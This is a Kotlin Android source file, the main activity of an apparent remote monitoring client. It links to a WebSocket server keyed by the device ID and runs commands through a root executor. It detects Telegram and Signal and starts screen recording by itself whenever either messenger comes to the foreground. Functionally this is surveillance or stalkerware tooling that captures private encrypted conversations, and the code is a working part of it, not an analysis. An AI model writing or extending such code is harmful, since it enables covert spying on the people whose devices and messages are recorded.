package com.rdm.client

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.text.Editable
import android.text.TextWatcher
import android.util.Log
import android.view.KeyEvent
import android.view.inputmethod.EditorInfo
import android.widget.Button
import android.widget.CompoundButton
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import com.google.android.material.materialswitch.MaterialSwitch
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import kotlinx.coroutines.launch
import org.json.JSONObject
import android.provider.Settings

class MainActivity : AppCompatActivity() {
    private lateinit var tvStatus: TextView
    private lateinit var tvDeviceInfoHint: TextView
    private lateinit var tvRecordingStatus: TextView
    private lateinit var btnConnect: Button
    private lateinit var btnDisconnect: Button
    private lateinit var btnTestCommand: Button
    private lateinit var btnDetectApps: Button
    private lateinit var etServerUrl: EditText
    private lateinit var switchAppendDeviceId: MaterialSwitch

    // Telegram/Signal detection UI elements
    private lateinit var tvTelegramStatus: TextView
    private lateinit var tvTelegramRecording: TextView
    private lateinit var tvSignalStatus: TextView
    private lateinit var tvSignalRecording: TextView

    private lateinit var webSocketClient: WebSocketClient
    private lateinit var deviceId: String
    private var isServiceRunning = false
    private lateinit var rootExecutor: RootExecutor
    private lateinit var foregroundAppMonitor: ForegroundAppMonitor
    private lateinit var appDetector: AppDetector

    private val TAG = "MainActivity"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        // Get device ID
        deviceId = Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        ) ?: "unknown"

        // Initialize views
        tvStatus = findViewById(R.id.tvStatus)
        tvDeviceInfoHint = findViewById(R.id.tvDeviceInfoHint)
        tvRecordingStatus = findViewById(R.id.tvRecordingStatus)
        btnConnect = findViewById(R.id.btnConnect)
        btnDisconnect = findViewById(R.id.btnDisconnect)
        btnTestCommand = findViewById(R.id.btnTestCommand)
        btnDetectApps = findViewById(R.id.btnDetectApps)
        etServerUrl = findViewById(R.id.etServerUrl)
        switchAppendDeviceId = findViewById(R.id.switchAppendDeviceId)

        // Initialize Telegram/Signal detection UI elements
        tvTelegramStatus = findViewById(R.id.tvTelegramStatus)
        tvTelegramRecording = findViewById(R.id.tvTelegramRecording)
        tvSignalStatus = findViewById(R.id.tvSignalStatus)
        tvSignalRecording = findViewById(R.id.tvSignalRecording)

        // Set device ID hint
        tvDeviceInfoHint.text = "Device ID: $deviceId"

        // Initialize WebSocket client (will be replaced on connect)
        webSocketClient = WebSocketClient(this, "ws://placeholder:8443/ws/device", deviceId)

        // Initialize root executor
        rootExecutor = RootExecutor()

        // Initialize app detector for Telegram/Signal
        appDetector = AppDetector(this)

        // Initialize foreground app monitor with recording callbacks
        foregroundAppMonitor = ForegroundAppMonitor(
            context = this,
            rootExecutor = rootExecutor,
            webSocketClient = webSocketClient,
            onRecordingTrigger = { packageName -> startScreenRecording(packageName) },
            onRecordingStop = { stopScreenRecording() },
            onAppChanged = { packageName -> updateRecordingIndicators(packageName) }
        )

        // Set up listeners
        setupButtonListeners()
        setupTextWatchers()

        Log.d(TAG, "MainActivity created. Device ID: $deviceId")

        // Log UI elements initialization
        Log.d(TAG, "UI elements initialized:")
        Log.d(TAG, "  - tvStatus: OK")
        Log.d(TAG, "  - btnConnect: OK")
        Log.d(TAG, "  - tvTelegramStatus: OK")
        Log.d(TAG, "  - tvSignalStatus: OK")

        // Auto-start foreground monitor for testing (remove in production)
        lifecycleScope.launch {
            Log.d(TAG, "Auto-starting foreground monitor...")
            foregroundAppMonitor.start()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        foregroundAppMonitor.stop()
        disconnectFromServer()
        Log.d(TAG, "MainActivity destroyed")
    }

    private fun setupButtonListeners() {
        btnConnect.setOnClickListener {
            connectToServer()
        }

        btnDisconnect.setOnClickListener {
            disconnectFromServer()
        }

        btnDetectApps.setOnClickListener {
            Log.d(TAG, "Detect Apps button clicked")
            detectApps()
        }

        btnTestCommand.setOnClickListener {
            testCommand()
        }

        switchAppendDeviceId.setOnCheckedChangeListener { _, isChecked ->
            // URL is auto-updated in connectToServer
            Log.d(TAG, "Append device ID: $isChecked")
        }

        // Auto-start foreground monitor for testing (comment this out in production)
        btnDetectApps.setOnLongClickListener {
            Log.d(TAG, "Auto-starting foreground monitor for testing")
            detectApps()
            lifecycleScope.launch {
                foregroundAppMonitor.start()
            }
            true
        }
    }

    private fun setupTextWatchers() {
        etServerUrl.setOnEditorActionListener { _, actionId, event ->
            if (actionId == EditorInfo.IME_ACTION_DONE ||
                (event != null && event.keyCode == KeyEvent.KEYCODE_ENTER)) {
                connectToServer()
                true
            } else {
                false
            }
        }
    }

    private fun connectToServer() {
        val urlInput = etServerUrl.text.toString().trim()
        val serverUrl = if (switchAppendDeviceId.isChecked) {
            if (!urlInput.endsWith("/")) {
                "$urlInput/$deviceId"
            } else {
                "$urlInput$deviceId"
            }
        } else {
            urlInput
        }

        if (serverUrl.isEmpty()) {
            Toast.makeText(this, "Please enter server URL", Toast.LENGTH_SHORT).show()
            return
        }

        if (!serverUrl.startsWith("ws://") && !serverUrl.startsWith("wss://")) {
            Toast.makeText(this, "URL must start with ws:// or wss://", Toast.LENGTH_SHORT).show()
            return
        }

        tvStatus.text = "● Connecting..."
        tvStatus.setTextColor(getColor(R.color.status_connecting))

        lifecycleScope.launch {
            try {
                // Reinitialize WebSocket client with new URL
                webSocketClient = WebSocketClient(this@MainActivity, serverUrl, deviceId)

                // Start monitoring
                foregroundAppMonitor.start()

                // Detect apps
                detectApps()

                btnConnect.isEnabled = false
                btnDisconnect.isEnabled = true
                etServerUrl.isEnabled = false
                switchAppendDeviceId.isEnabled = false

                tvStatus.text = "● Connected"
                tvStatus.setTextColor(getColor(R.color.status_connected))

                Toast.makeText(this@MainActivity, "Connected to server", Toast.LENGTH_SHORT).show()
                Log.d(TAG, "Connected to server: $serverUrl")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to connect to server", e)
                tvStatus.text = "● Failed"
                tvStatus.setTextColor(getColor(R.color.status_disconnected))
                Toast.makeText(this@MainActivity, "Connection failed: ${e.message}", Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun disconnectFromServer() {
        try {
            webSocketClient.disconnect()
            foregroundAppMonitor.stop()

            btnConnect.isEnabled = true
            btnDisconnect.isEnabled = false
            etServerUrl.isEnabled = true
            switchAppendDeviceId.isEnabled = true

            tvStatus.text = "● Offline"
            tvStatus.setTextColor(getColor(R.color.status_disconnected))

            Toast.makeText(this, "Disconnected from server", Toast.LENGTH_SHORT).show()
            Log.d(TAG, "Disconnected from server")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to disconnect", e)
        }
    }

    private fun detectApps() {
        Log.d(TAG, "detectApps() called")
        lifecycleScope.launch {
            val detectedResult = appDetector.detectApps()

            if (detectedResult.isSuccess) {
                val detectedApps = detectedResult.getOrNull() ?: emptyMap()

                // Update Telegram UI
                val telegramApp = detectedApps["Telegram"]
                if (telegramApp != null && telegramApp.isInstalled) {
                    tvTelegramStatus.text = "✓ Detected"
                    tvTelegramStatus.setTextColor(getColor(R.color.status_connected))
                } else {
                    tvTelegramStatus.text = "Not detected"
                    tvTelegramStatus.setTextColor(getColor(R.color.text_secondary))
                }

                // Update Signal UI
                val signalApp = detectedApps["Signal"]
                if (signalApp != null && signalApp.isInstalled) {
                    tvSignalStatus.text = "✓ Detected"
                    tvSignalStatus.setTextColor(getColor(R.color.status_connected))
                } else {
                    tvSignalStatus.text = "Not detected"
                    tvSignalStatus.setTextColor(getColor(R.color.text_secondary))
                }

                val detectedCount = detectedApps.values.count { it.isInstalled }
                Toast.makeText(this@MainActivity, "$detectedCount app(s) detected", Toast.LENGTH_SHORT).show()
                Log.d(TAG, "Apps detected: $detectedCount")
            }
        }
    }

    private fun startScreenRecording(packageName: String) {
        if (isServiceRunning) {
            Log.w(TAG, "Recording service already running")
            return
        }

        lifecycleScope.launch {
            try {
                val intent = Intent(this@MainActivity, ScreenRecordService::class.java).apply {
                    action = ScreenRecordService.ACTION_START
                    putExtra(ScreenRecordService.EXTRA_APP_PACKAGE, packageName)
                }
                startForegroundService(intent)

                isServiceRunning = true

                val appName = appDetector.getAppName(packageName) ?: packageName
                updateRecordingIndicators(packageName)
                tvRecordingStatus.text = "Recording: $appName"
                tvRecordingStatus.setTextColor(getColor(R.color.status_recording))

                Toast.makeText(this@MainActivity, "Recording started for $appName", Toast.LENGTH_SHORT).show()
                Log.d(TAG, "Screen recording service started")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to start screen recording", e)
                Toast.makeText(this@MainActivity, "Failed to start recording: ${e.message}", Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun stopScreenRecording() {
        if (!isServiceRunning) {
            return
        }

        try {
            val intent = Intent(this, ScreenRecordService::class.java).apply {
                action = ScreenRecordService.ACTION_STOP
            }
            startService(intent)

            isServiceRunning = false
            tvRecordingStatus.text = "Ready to monitor"
            tvRecordingStatus.setTextColor(getColor(R.color.text_secondary))

            // Clear recording indicators
            updateRecordingIndicators(null)

            Log.d(TAG, "Stopped screen recording")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to stop screen recording", e)
        }
    }

    private fun updateRecordingIndicators(packageName: String?) {
        val isRecording = isServiceRunning

        // Check if Telegram
        if (packageName != null && packageName.contains("telegram", ignoreCase = true)) {
            if (isRecording) {
                tvTelegramRecording.text = "●"
                tvTelegramRecording.setTextColor(getColor(R.color.status_recording))
            } else {
                // Telegram is foreground but not recording (permission denied or error)
                tvTelegramRecording.text = "!"
                tvTelegramRecording.setTextColor(getColor(R.color.status_connecting))
            }
        } else {
            // Telegram is not foreground
            tvTelegramRecording.text = "○"
            tvTelegramRecording.setTextColor(getColor(R.color.status_disconnected_dim))
        }

        // Check if Signal
        if (packageName != null && (packageName.contains("thoughtcrime", ignoreCase = true) ||
                                     packageName.contains("signal", ignoreCase = true))) {
            if (isRecording) {
                tvSignalRecording.text = "●"
                tvSignalRecording.setTextColor(getColor(R.color.status_recording))
            } else {
                // Signal is foreground but not recording
                tvSignalRecording.text = "!"
                tvSignalRecording.setTextColor(getColor(R.color.status_connecting))
            }
        } else {
            // Signal is not foreground
            tvSignalRecording.text = "○"
            tvSignalRecording.setTextColor(getColor(R.color.status_disconnected_dim))
        }
    }

    private fun testCommand() {
        lifecycleScope.launch {
            try {
                Log.d(TAG, "Executing test command...")
                val result = rootExecutor.execute("ls -la /system/app")

                if (result.success) {
                    Toast.makeText(this@MainActivity, "Command executed successfully", Toast.LENGTH_SHORT).show()
                    Log.d(TAG, "Test command result: SUCCESS")
                } else {
                    Toast.makeText(this@MainActivity, "Command failed: ${result.error}", Toast.LENGTH_LONG).show()
                    Log.d(TAG, "Test command result: FAILED - ${result.error}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "Test command failed", e)
                Toast.makeText(this@MainActivity, "Error: ${e.message}", Toast.LENGTH_LONG).show()
            }
        }
    }
}
